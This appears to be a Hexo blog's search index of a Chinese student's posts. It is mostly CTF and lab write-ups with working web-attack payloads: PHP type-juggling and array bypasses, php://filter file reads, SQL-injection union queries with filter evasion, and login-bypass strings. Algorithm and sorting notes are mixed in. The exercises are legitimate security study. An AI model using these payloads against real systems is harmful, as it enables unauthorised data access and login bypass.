<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[简单的代码审计]]></title>
    <url>%2F2019%2F04%2F25%2F%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[bugku里一些简单的代码审计题extract变量覆盖http://123.206.87.240:9009/1.php12345678910111213141516&lt;?php$flag='xxx';extract($_GET);if(isset($shiyan))&#123;$content=trim(file_get_contents($flag));if($shiyan==$content)&#123;echo'flag&#123;xxx&#125;';&#125;else&#123;echo'Oh.no';&#125;&#125;?&gt; 首先extract函数用来将变量从数组中导入到当前的符号表中。这里要让$shiyan==$content,那么只要给$flag和$shiyan变量同时传入空值即可。 1payload:shiyan=&amp;flag= strcmp比较字符串http://123.206.87.240:9009/6.php12345678910 &lt;?php $flag = "flag&#123;xxxxx&#125;"; if (isset($_GET['a'])) &#123; if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写） die('Flag: '.$flag); else print 'No'; &#125;?&gt; 在5.3之前的php中,strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制. 1payload:a[]=1 urldecode二次编码绕过http://123.206.87.240:9009/10.php12345678910111213141516171819202122&lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123;echo("not allowed!");exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123;echo "Access granted!";echo "flag";&#125;?&gt; (PHP 4, PHP 5)eregi函数以不区分大小写的正则表达式匹配，我们只要利用两次urldecode第一次是浏览器的解码第二次是函数的解码，就可以绕过了。这里只对其中一个字符D编码两次就行了，由于D的ascii码16进制值为0x44，所以第一次urlencode是%44，第二次%2544。1payload:id=hacker%2544J md5()函数http://123.206.87.240:9009/18.php123456789101112&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if (isset($_GET['username']) and isset($_GET['password'])) &#123;if ($_GET['username'] == $_GET['password'])print 'Your password can not be your username.';else if (md5($_GET['username']) === md5($_GET['password']))die('Flag: '.$flag);elseprint 'Invalid password';&#125;?&gt; 这是一道很经典的题了，两变量值不等MD5值相等，利用MD5对数组返回NULL，即可绕过。1payload:username[]=1&amp;password[]=2 数组返回NULL绕过http://123.206.87.240:9009/19.php123456789101112&lt;?php$flag = "flag";if (isset ($_GET['password'])) &#123;if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)echo 'You password must be alphanumeric';else if (strpos ($_GET['password'], '--') !== FALSE)die('Flag: ' . $flag);elseecho 'Invalid password';&#125;?&gt; 看到题目就知道要，传数组进去了，两次返回都是NULL，不等于FALSE绕过成功。还有可以正常利用ereg遇到%00就截止来绕过。1payload: password[]=1或password=a%00-- 弱类型整数大小比较绕过http://123.206.87.240:9009/22.php1234$temp = $_GET['password'];is_numeric($temp)?die("no numeric"):NULL;if($temp&gt;1336)&#123;echo $flag; is_numeric() 函数用于检测变量是否为数字或数字字符串。可以用数组绕过，也可以在数字后跟任意符号或文本绕过。1payload: password[]=1或password=1367$ sha()函数比较绕过http://123.206.87.240:9009/7.php123456789101112131415161718192021222324252627282930&lt;?php$flag = "flag";if (isset($_GET['name']) and isset($_GET['password']))&#123;var_dump($_GET['name']);echo "";var_dump($_GET['password']);var_dump(sha1($_GET['name']));var_dump(sha1($_GET['password']));if ($_GET['name'] == $_GET['password'])echo 'Your password can not be your name!';else if (sha1($_GET['name']) === sha1($_GET['password']))die('Flag: '.$flag);elseecho 'Invalid password.';&#125;elseecho 'Login first!';?&gt; 数组绕过,sha1()函数无法处理数组类型，将报错并返回NULL，if 条件成立，获得flag。1payload: name[]=1&amp;password[]=2 md5加密相等绕过http://123.206.87.240:9009/13.php123456789101112&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123;echo "flag&#123;*&#125;";&#125; else &#123;echo "false!!!";&#125;&#125;else&#123;echo "please input a";&#125;?&gt; 由于php对数据的处理问题，当它读到0exxx的时候会当做科学计数法来处理。无论0e后面是什么，0的多少次方还是0.md5(QNKCDZO)=0e830400451993494058024219903391md5(240610708)=0e4620974319065090195629887368541payload: a=240610708 十六进制与数字比较http://123.206.87.240:9009/20.php12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;$flag = 'flag&#123;test&#125;';$one = ord('1'); //ord — 返回字符的 ASCII 码值$nine = ord('9'); //ord — 返回字符的 ASCII 码值$number = '3735929054';// Check all the input characters!for ($i = 0; $i &lt; strlen($number); $i++)&#123;// Disallow all the digits!$digit = ord($temp&#123;$i&#125;);if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;// Aha, digit not allowed!return "flase";&#125;&#125;if($number == $temp)return $flag;&#125;$temp = $_GET['password'];echo noother_says_correct($temp);?&gt; 根据题目提示，把3735929054转为16进制0xdeadc0de，发现刚好绕过。1payload: password=0xdeadc0de ereg正则%00截断http://123.206.87.240:9009/5.php1234567891011121314151617181920212223242526272829303132333435&lt;?php$flag = "xxx";if (isset ($_GET['password']))&#123;if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)&#123;echo 'You password must be alphanumeric';&#125;else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999)&#123;if (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置&#123;die('Flag: ' . $flag);&#125;else&#123;echo('- have not been found');&#125;&#125;else&#123;echo 'Invalid password';&#125;&#125;?&gt; 科学计数法+%00截断绕过ereg,%00算一个字符。还有就是数组也可以绕过。。。1payload: password=1e9%00*-* 或password[]=1 strpos数组绕过http://123.206.87.240:9009/15.php1234567891011&lt;?php$flag = "flag";if (isset ($_GET['ctf'])) &#123;if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)echo '必须输入数字才行';else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)die('Flag: '.$flag);elseecho '骚年，继续努力吧啊~';&#125;?&gt; 两个函数遇见数组都返回NULL，就都绕过了。1payload: ctf[]=1]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali安装docker]]></title>
    <url>%2F2019%2F04%2F19%2Fkali%E5%AE%89%E8%A3%85docker%2F</url>
    <content type="text"><![CDATA[第一步123456apt-get updateapt-get install -y apt-transport-https ca-certificatesapt-get install dirmngr 第二步123456apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609Decho 'deb https://apt.dockerproject.org/repo debian-stretch main' &gt; /etc/apt/sources.list.d/docker.list 第三步1234apt-get updateapt-get install docker-engine]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[西湖论剑2019]]></title>
    <url>%2F2019%2F04%2F07%2F%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912019%2F</url>
    <content type="text"><![CDATA[#CRYPTO哈夫曼之谜123456789101111000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110a:4d:9g:1f:5l:10:75:9&#123;:1&#125;:1 123456import huffmanimport collectionst1=huffman.codebook([('a', 4), ('d', 9), ('g', 1), ('f', 5),('l', 1),('0', 7),('5', 9),('&#123;', 1),('&#125;', 1)])print(t1)#&#123;'a': '000', 'd': '10', 'g': '00100', 'f': '110', 'l': '00101', '0': '111', '5': '01', '&#123;': '00111', '&#125;': '00110'&#125;#得到f&#123;algddf5dfd0f05550500a5af55dd0d5d0ad&#125;，权重一样的位置可以交换，最后提交ddf5dfd0f05550500a5af55dd0d5d0ad成功 #babyt3http://ctf1.linkedbyx.com:10300首页发现是任意文件读取，然后又看到hint，base64解码得到dir.php,然后用php伪协议读取dir.php，再base64解码payload:1http://ctf1.linkedbyx.com:10300/?file=php://filter/read=convert.base64-encode/resource=dir.php 得到源码123456&lt;?php$a = @$_GET['dir'];if(!$a)&#123;$a = '/tmp';&#125;var_dump(scandir($a)); scandir() 函数返回指定目录中的文件和目录的数组,再同级和上级目录都试试，发现上级目录是存在文件的payload：1http://ctf1.linkedbyx.com:10300/dir.php?dir=/.. 返回目录信息1array(25) &#123; [0]=&gt; string(1) "." [1]=&gt; string(2) ".." [2]=&gt; string(10) ".dockerenv" [3]=&gt; string(3) "bin" [4]=&gt; string(4) "boot" [5]=&gt; string(3) "dev" [6]=&gt; string(3) "etc" [7]=&gt; string(16) "ffffflag_1s_Her4" [8]=&gt; string(4) "home" [9]=&gt; string(3) "lib" [10]=&gt; string(5) "lib64" [11]=&gt; string(5) "media" [12]=&gt; string(3) "mnt" [13]=&gt; string(7) "my_init" [14]=&gt; string(10) "my_service" [15]=&gt; string(3) "opt" [16]=&gt; string(4) "proc" [17]=&gt; string(4) "root" [18]=&gt; string(3) "run" [19]=&gt; string(4) "sbin" [20]=&gt; string(3) "srv" [21]=&gt; string(3) "sys" [22]=&gt; string(3) "tmp" [23]=&gt; string(3) "usr" [24]=&gt; string(3) "var" &#125; 发现ffffflag_1s_Her4，再读取就好了，得到flagpayload：1http://ctf1.linkedbyx.com:10300/?file=/ffffflag_1s_Her4]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pragyan CTF19 webwp]]></title>
    <url>%2F2019%2F03%2F10%2FPragyan-CTF19-webwp%2F</url>
    <content type="text"><![CDATA[Cookie Monster 100Do prepare to see cookies lurking everywhere. http://159.89.166.12:13500/12345678910111213141516171819202122import requestsimport hashlibfrom itertools import *import stringflag = []wordlist = string.printables = requests.session()for i in range(40): cookie = s.get('http://159.89.166.12:13500/').cookies['flag'] flag.append(cookie)print (flag)result= []for i in flag: for j in permutations(wordlist,2): guess = "".join(j) md5 = hashlib.md5(guess.encode("utf8")).hexdigest() if md5 ==i: result.append(guess) breakprint (result) Game of Faces 100The Game of Faces, welcomes you. In this era, where AIs generate a lot of faces, we would like you to contribute to the same by uploading your image. Thank you for contributing, to continue. http://159.89.166.12:15000/12把css删掉，发现一个假的提交，得到一个base64，解码得The_scroll_says=the_night_kingVSvalyrian.txt，然后直接访问。。。http://159.89.166.12:15000/the_night_kingVSvalyrian.txt Mandatory PHP 125PHP, PHP everywhere get the flag and earn your points there. http://159.89.166.12:14000/ 12345678910111213141516171819202122232425262728293031&lt;?php include 'flag.php'; highlight_file('index.php'); $a = $_GET["val1"]; $b = $_GET["val2"]; $c = $_GET["val3"]; $d = $_GET["val4"]; if(preg_match('/[^A-Za-z]/', $a)) die('oh my gawd...'); $a=hash("sha256",$a); $a=(log10($a**(0.5)))**2; //传入 $a='pp';会发现 float(INF) phpif($c&gt;0&amp;&amp;$d&gt;0&amp;&amp;$d&gt;$c&amp;&amp;$a==$c*$c+$d*$d) //这里也传入无限大$s1="true"; else die("Bye..."); if($s1==="true") echo $flag1; for($i=1;$i&lt;=10;$i++)&#123; if($b==urldecode($b)) //编码11次 die('duck'); else $b=urldecode($b); &#125; if($b==="WoAHh!") $s2="true"; else die('oops..'); if($s2==="true") echo $flag2; die('end...'); ?&gt; payload: http://159.89.166.12:14000/?val1=pp&amp;val2=WoAHh%2525252525252525252521&amp;val3=1&amp;val4=100000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000]]></content>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku速度要快wp]]></title>
    <url>%2F2018%2F12%2F10%2Fbugku%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%ABwp%2F</url>
    <content type="text"><![CDATA[http://123.206.87.240:8002/web6/这道题我首先在headers里发现flag，base64解码然后提交失败，发现是需要post得到的数据，然后试了半天都不对，结果发现需要post的是两次解码后的得到的数字。。。无语，上代码 1234567891011121314151617import reimport requestsimport base64url='http://123.206.87.240:8002/web6/'s = requests.Session()#创建session对象，保存Cookie值r = s.get(url)'''txt1 = re.search("flag': '(.*?)',",str(r.headers),re.S)txt2=re.search(".*?: (.*?)'",str(base64.b64decode(txt1.group(1))),re.S)这个是我刚开始绕的弯路,基础功不扎实'''txt1=r.headers['flag']txt2=re.search(".*?: (.*?)'",str(base64.b64decode(txt1)),re.S)flag=base64.b64decode(txt2.group(1))d=&#123;"margin":flag&#125;print(s.post(url,data=d).text)]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nctf打卡题]]></title>
    <url>%2F2018%2F11%2F27%2Fnctf%E6%89%93%E5%8D%A1%E9%A2%98%2F</url>
    <content type="text"><![CDATA[我果真是太菜了，nctf只做出了web签到题和re签到题外加打了一个i wanna，连web的sql注入签到都没有做出来，在看了一位大佬的write up后，感觉收获很多。http://ctfgame.acdxvfsvd.net:20001/首先学到了空格的过滤绕过：1%20 %09 %0a %0b %0c %0d %a0 %00 /**/ () 发现过滤了截断符号%23,#,–+，只要在语句最后在加个单引号使其闭合就可以了，’’空的也可以执行，就不用用注释了。然后大佬提到’必须直接跟在select后。123?id=1'' 查询:select * from user where id='1''' LIMIT0,1 可以?id=1' and 1=1' 查询:select * from users where id='1' and 1=1'' LIMIT 0,1 不可以id=-1' union select 1,2,3' 可以 然后用子查询进行操作,select * from user where id=’-1’ union select (select group_concat(schema_name) from information_schema.schemata),2,3’，这样就行了。1234http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),2,3%27爆数据库名，应该是这个flaaaaaaag数据库。http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=%27flaaaaaaag%27),2,3%27爆表名，f144444444ghttp://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=%27f144444444g%27),2,3%27爆列名，th1s_1s_flaghttp://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0th1s_1s_flag%a0from%a0flaaaaaaag.f144444444g),2,3%27查询到flag 收获很多。]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[11.15]]></title>
    <url>%2F2018%2F11%2F15%2F11-15%2F</url>
    <content type="text"><![CDATA[这几天又开始学前端了，准备和活动室里两个大佬合伙做院科协的网页设计活动，真的很忙呀！！！然后昨天郁师傅推荐了一个上传漏洞的靶场https://github.com/c0ny1/upload-labs，于是我又要学php了，得学会php的代码审计吧！！！]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[铺地毯问题]]></title>
    <url>%2F2018%2F11%2F04%2F%E9%93%BA%E5%9C%B0%E6%AF%AF%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[这道题我进坑了，我看到这个题的第一反应就是定义一个二维数组模拟坐标系，按顺序把地毯数存进覆盖的坐标中。然后我就看到内存达到128000KB，下载输入测试文件，发现了10000个地毯数据QAQ~!!刚开始的代码12345678910111213141516171819202122232425#include &lt;stdio.h&gt;int array[10001][10001]=&#123;0&#125;;int main ()&#123; int x,y,a,b,g,h; int n; scanf("%d",&amp;n); for(int i=1;i&lt;=n;i++) &#123; scanf("%d %d %d %d",&amp;a,&amp;b,&amp;g,&amp;h); for(int j=a;j&lt;=a+g;j++)//把地毯覆盖的点赋值 &#123; for(int k=b;k&lt;=b+h;k++) &#123; array[j][k]=i; &#125; &#125; &#125; scanf("%d %d",&amp;x,&amp;y); if(array[x][y]==0) &#123; printf("-1"); &#125;else printf("%d",array[x][y]); return 0;&#125; 然后我就去看下大佬是怎么解决的，瞬间就明白了，微笑，默叹，以为妙绝。正确思路应该是这样的，定义一个数组，按顺序保存地毯四个角的坐标，再逆序判断给定点是否在地毯内就行了。改写代码如下，顺利AC，收获挺大的。1234567891011121314151617181920212223#include &lt;stdio.h&gt;int a[10001][5];int main()&#123; int x,y,n; scanf("%d",&amp;n); for(int i=1;i&lt;=n;i++) &#123; scanf("%d %d %d %d",&amp;a[i][1],&amp;a[i][2],&amp;a[i][3],&amp;a[i][4]); a[i][3]+=a[i][1]; a[i][4]+=a[i][2]; &#125;//数组只是用来记录第i个地毯的四个点的坐标 scanf("%d %d",&amp;x,&amp;y); for(int i=n;i&gt;=1;i--)//逆序判断地毯是否覆盖（x，y） &#123; if(a[i][1]&lt;=x&amp;&amp;a[i][2]&lt;=y&amp;&amp;a[i][3]&gt;=x&amp;&amp;a[i][4]&gt;=y) &#123;printf("%d",i); return 0; &#125; &#125; printf("-1");//没有则输出-1 return 0;&#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[尝试简单的sql注入]]></title>
    <url>%2F2018%2F11%2F02%2F%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[感觉有点汗颜，因为线代、高数，以及我萌生了想学算法的念头，导致我没时间学习安全，今天下午没课我就练了几道简单的sql注入题。说来都是巧合，昨天我们c语言老师推荐了第四版的《加密与解密》，今天我就望着价钱瑟瑟发抖，然后看见这本书是由看雪论坛的大神写的，所以机缘巧合就看到了这个帖子。https://bbs.pediy.com/thread-218653.htm这个帖子里提供了几个云靶机。我就选择了OWASP Bricks练手(我是菜鸟),这是地址http://43.247.91.228:83/login-pages.html第一题在username输入以下语句都可以，只要让引号闭合并使语句成立就行，比如可以在后面加#，注释掉后面的语句123451' or 1 #1' or 1 or '' or 1 #' or 1 or '1' or 1=1 # 第二题发现使用了js验证，加了黑名单禁止输入特殊字符。可以右键查看源代码看看js代码，然后打开开发者工具在console里修改该js函数，再使用注入语句就行了。 第三题发现它在两边加入了括号()，所以只要构造语句使括号闭合就行。121') or 1 #1') or 1 or(' 第四题和第三题差不多，只不过使用双引号””包裹字符串。121") or 1 #1") or 1 or (" 第五题直接用第一题的语句注入，发现返回了输入密码的MD5值，虽然我不知道这是干什么的。 第六题我也不知道是干啥的，可以直接注入，我搜了下题目名automatic redirect 叫自动重定向。我再问问大佬这是啥。]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法上的一些术语]]></title>
    <url>%2F2018%2F11%2F02%2F%E7%AE%97%E6%B3%95%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9C%AF%E8%AF%AD%2F</url>
    <content type="text"><![CDATA[我发现了一个较严重问题，就是听不懂大佬说的一些名词，感受到了莫名的恐惧？？？于是我从网上找了一些术语，写在这里。 OJ平台 简写 全称 中文称谓 OJ Online Judge 在线判题系统 AC Accepted 通过 WA Wrong Answer 答案错误 TLE Time Limit Exceed 超时 OLE Output Limit Exceed 超过输出限制 MLE Memory Limit Exceed 超内存 RE Runtime Error 运行时错误 PE Presentation Error 格式错误 CE Compile Error 无法编译 算法常用术语英中对照 英语 中文 Approximate String Matching 模糊匹配 Arbitrary Precision Arithmetic 高精度计算 Bandwidth Reduction 带宽压缩 Bin Packing 装箱问题 Calendrical Calculations 日期 Clique 最大团 Combinatorial Problems 组合问题 Computational Geometry 计算几何 Connected Components 连通分支 Constrained and Unconstrained Optimization 最值问题 Convex Hull 凸包 Cryptography 密码 Data Structures 基本数据结构 Determinants and Permanents 行列式 Dictionaries 字典 Discrete Fourier Transform 离散Fourier变换 Drawing Graphs Nicely 图的描绘 Drawing Trees 树的描绘 Edge and Vertex Connectivity 割边/割点 Edge Coloring 边染色 Eulerian Cycle / Chinese Postman Euler 回路/中国邮路 Factoring and Primality Testing 因子分解/质数判定 Feedback Edge/Vertex Set 最大无环子图 Finite State Machine Minimization 有穷自动机简化 Generating Graphs 图的生成 Generating Partitions 划分生成 GeneratingPermutations 排列生成 GeneratingSubsets 子集生成 Graph Data Structures 图形数据结构 Graph Isomorphism 图同构 Graph Partition 图的划分 Graph Problems — hard 图论-NP问题 Graph Problems — polynomial 图论-多项式算法 Hamiltonian Cycle Hamilton 回路 Independent Set 独立集 Intersection Detection 碰撞测试 Job Scheduling 工程安排 Kd-Trees 线段树 Knapsack Problem 背包问题 Linear Programming 线性规划 Longest Common Substring 最长公共子串 Maintaining Line Arrangements 平面分割 Matching 匹配 Matrix Multiplication 矩阵乘法 Medial-Axis Transformation 中轴变换 Median and Selection 中位数 Minimum Spanning Tree 最小生成树 Minkowski Sum Minkowski和 Motion Planning 运动规划 Nearest Neighbor Search 最近点对查询 Network Flow 网络流 Numerical Problems 数值问题 Planarity Detection and Embedding 平面性检测和嵌入 Point Location 位置查询 Polygon Partitioning 多边形分割 Priority Queues 优先队列 Random Number Generation 随机数生成 Range Search 范围查询 rate of convergence 收敛速度 robustness 鲁棒性 Satisfiability 可满足性 Searching 查找 Set and String Problems 集合与串的问题 Set Cover 集合覆盖 Set Data Structures 集合 Shape Similarity 相似多边形 Shortest Common Superstring 最短公共父串 Shortest Path 最短路径 Simplifying Polygons 多边形化简 Solving Linear Equations 线性方程组 Sorting 排序 Steiner Tree Steiner树 String Matching 模式匹配 Text Compression 压缩 Topological Sorting 拓扑排序 Transitive Closure and Reduction 传递闭包 Traveling Salesman Problem 旅行商问题 Triangulation 三角剖分 Vertex Coloring 点染色 Vertex Cover 点覆盖 Voronoi Diagrams Voronoi图]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>术语</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[过河卒问题]]></title>
    <url>%2F2018%2F11%2F01%2F%E8%BF%87%E6%B2%B3%E5%8D%92%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[学长给我安利洛谷平台，我打算开始做题然后提升，结果我做过河卒这个题就做了一天。刚开始写的程序有一些逻辑上的漏洞，测试时不能全部通过，曹老板告诉我可以下载测试数据来看，然后就找到漏洞所在，再一个一个的完善，做出来后还是很开心的。 我的心路历程首先可以发现到达当前坐标的路径数等于左边和上边路径数之和，然后我就想构造二维数组，用遍历的方法，把每一个坐标都算出来。在此之前，我需要把第0行第0列赋值为1，也需要判断马控制的坐标(马走日)在不在数组内，并赋值为0，在循环的时候写判断跳过控制点即可。我的方法就是这么复杂，以至于我刚开始漏掉好多判断条件，比如说当马控制点落在第0行或第0列时，控制点之后都将为0。当我看题解的时候，发现一堆我看不懂的名词，什么动态规划dp，什么滚动数组，还有用递归的方法做。我这个渣渣还是遍历就好了，等我再学一段时间，再来看会不会这些方法，并写进来。 我的代码先附上我的遍历方法，学会更好的方法再补充。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;stdio.h&gt;long long a[21][21];int define_horse_control1(long long array[21][21],int x,int y)//定义一个函数，把马控制的点赋为0&#123; array[x][y]=0; if(x-2&gt;=0&amp;&amp;y-1&gt;=0)array[x-2][y-1]=0;//这里都要判断一下有没有越界 if(x-2&gt;=0&amp;&amp;y+1&lt;=20)array[x-2][y+1]=0; if(x-1&gt;=0&amp;&amp;y-2&gt;=0)array[x-1][y-2]=0; if(x+1&lt;=20&amp;&amp;y-2&gt;=0)array[x+1][y-2]=0; if(x+2&lt;=20&amp;&amp;y-1&gt;=0)array[x+2][y-1]=0; if(y+1&lt;=20&amp;&amp;x+2&lt;=20)array[x+2][y+1]=0; if(x-1&gt;=0&amp;&amp;y+2&lt;=20)array[x-1][y+2]=0; if(x+1&lt;=20&amp;&amp;y+2&lt;=20)array[x+1][y+2]=0; return array[21][21]; &#125;int define_horse_control2(long long array[21][21],int x,int y,int n,int m)//如果马的控制点在第0行或者第0列，在马控制点以后的值全为0&#123; if(x-2==0) &#123; if(y-1&gt;=1) &#123; for(int i=y-1;i&lt;=n;i++)a[0][i]=0; &#125;else &#123;for(int i=y+1;i&lt;=n;i++)a[0][i]=0;&#125; &#125; if(x-1==0) &#123; if(y-2&gt;=1) &#123; for(int i=y-2;i&lt;=n;i++)a[0][i]=0; &#125;else&#123;for(int i=y+2;i&lt;=n;i++)a[0][i]=0;&#125; &#125; if(x==0) &#123; for(int i=y;i&lt;=n;i++)a[0][i]=0; &#125; if(y-1==0) &#123; if(x-2&gt;=1) &#123; for(int i=x-2;i&lt;=m;i++)a[i][0]=0; &#125;else&#123;for(int i=x+2;i&lt;=m;i++)a[i][0]=0;&#125; &#125; if(y-2==0) &#123; if(x-1&gt;=1) &#123; for(int i=x-1;i&lt;=m;i++)a[i][0]=0; &#125;else&#123;for(int i=x+1;i&lt;=m;i++)a[i][0]=0;&#125; &#125; if(y==0) &#123; for(int i=x;i&lt;=m;i++)a[i][0]=0; &#125;&#125;int main()&#123; int m,n,x,y; scanf("%d %d %d %d",&amp;m,&amp;n,&amp;x,&amp;y); a[0][0]=0; for(int i=1;i&lt;=n;i++)a[0][i]=1;//到达第一行第一列的点都只有一条路径，都赋值为1 for(int i=1;i&lt;=m;i++)a[i][0]=1;//到达第一行第一列的点都只有一条路径，都赋值为1 define_horse_control1(a,x,y);//把马控制的点赋为0 define_horse_control2(a,x,y,n,m);//如果马的控制点在第0行或者第0列，在马控制点以后的值全为0 for(int i=1;i&lt;=m;i++)//遍历计算到当前坐标的路径数，只需要遍历到第m行和第n列即可。 &#123; for(int j=1;j&lt;=n;j++) &#123; if((i==x-2&amp;&amp;j==y-1)||(i==x-2&amp;&amp;j==y+1)||(i==x-1&amp;&amp;j==y-2)||(i==x+1&amp;&amp;j==y-2)||(i==x+2&amp;&amp;j==y-1)||(j==y+1&amp;&amp;i==x+2)||(i==x-1&amp;&amp;j==y+2)||(i==x+1&amp;&amp;j==y+2)||(i==x&amp;&amp;j==y)) &#123; continue;//跳过马的控制点的计算 &#125; a[i][j]=a[i][j-1]+a[i-1][j];//当前坐标的路径数等于左边和上边路径数之和 &#125; &#125; printf("%lld",a[m][n]); return 0;&#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[排序]]></title>
    <url>%2F2018%2F10%2F30%2F%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[c刚看到数组，只会写个简单的冒泡排序。发现自己还真是菜，抱着ljr老师的算法书半天都看不懂，没办法只能自己慢慢啃了。 算法原理(摘自百度百科) 比较相邻的元素。如果第一个比第二个大，就交换他们两个。 对每一对相邻元素做同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。 针对所有的元素重复以上的步骤，除了最后一个。 持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。 下面用python实现12345678def bubble_sort(nums): n = len(nums) for i in range(1,n): # n个数，比较n-1趟 for j in range(n - i):#n个数，去掉最后面排好序的(i-1)个数，剩余n-i+1个数比较n-1次，[0,n-i-1]每次判断到下标j=n-1-i即可，因为前闭后开，所以要+1 if nums[j] &gt; nums[j + 1]: nums[j], nums[j + 1] = nums[j + 1], nums[j] return numsprint(bubble_sort([1,4,5,3])) 下面用c实现12345678910111213141516171819202122#include&lt;stdio.h&gt;#define maxn 100000int a[maxn];int main()&#123; int x,n=0; while(scanf("%d",&amp;x)==1) a[n++]=x;//最后一次n又加1,所以,数组下标0到n-1 ,n个数 for(int i=1;i&lt;=n-1;i++)//n个数,比较(n-1)趟 &#123; for(int j=0;j&lt;=n-i-1;j++)//n个数,去掉最后面(i-1)个数,剩余n-i+1个数比较n-i次.每次判断到下标j=n-1-i即可 &#123; if(a[j]&gt;a[j+1]) &#123; a[j] = a[j]+a[j+1]; a[j+1] = a[j]-a[j+1]; a[j]=a[j]-a[j+1]; &#125; &#125; &#125; for(int i=0;i&lt;=n-1;i++)printf("%d ",a[i]); return 0; &#125; 学会选择法排序了123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;void sort(int *pa,int n)&#123; int index,i,k,temp; for(k=0;k&lt;n-1;k++) &#123; index=k; for(i=k+1;i&lt;n;i++) &#123; if(pa[i]&lt;pa[index])index=i; &#125; if(index!=k) &#123; temp=pa[index]; pa[index]=pa[k]; pa[k]=temp; &#125; &#125; &#125;int main()&#123; int n,i; scanf("%d",&amp;n); int a[n]; for(i=0;i&lt;=n-1;i++)scanf("%d",&amp;a[i]); sort(a,n); for(i=0;i&lt;=n-1;i++)printf("%d ",*(a+i)); return 0;&#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>算法</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[埃氏筛法筛素数]]></title>
    <url>%2F2018%2F10%2F27%2F%E5%9F%83%E6%B0%8F%E7%AD%9B%E6%B3%95%E7%AD%9B%E7%B4%A0%E6%95%B0%2F</url>
